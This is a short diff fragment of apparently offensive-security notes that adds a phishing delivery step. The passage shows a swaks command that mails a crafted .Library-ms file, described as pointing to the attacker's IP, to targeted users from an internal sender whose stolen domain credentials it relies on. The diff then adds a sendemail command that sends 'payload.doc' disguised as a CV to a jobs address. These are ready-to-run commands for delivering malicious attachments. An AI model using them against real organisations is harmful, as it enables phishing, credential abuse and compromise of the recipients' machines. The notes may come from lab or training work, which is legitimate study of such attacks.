@@ -49,3 +49,8 @@ Now distribute the library file that points to our IP (assuming we have crafted 
 sudo swaks -t <chump1@targetDomain.com> -t <chump2@targetDomain.com> --from <chump3@targetDomain.com> --attach @config.Library-ms --server <mail server IP> --body @body.txt --header "Subject: Super Fun Script" --suppress-data -ap
 ```
 Nb. for the command above to succeed we'll need the domain creds of `chump3`.
+
+Alternatively `sendemail` is also a thing:
+```bash
+sendemail -t jobs@cowmotors-int.com -f Mithrandir@cowmotors-int.com -s 192.168.232.201 -m "cv" -u "cv" -a payload.doc -v
+```
